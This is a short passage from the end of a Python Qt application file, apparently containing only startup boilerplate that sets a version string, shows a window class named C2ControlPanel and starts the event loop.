    app.setApplicationVersion("3.0.0")
    
    window = C2ControlPanel()
    window.show()
    
    sys.exit(app.exec_())

if __name__ == "__main__":
    main()
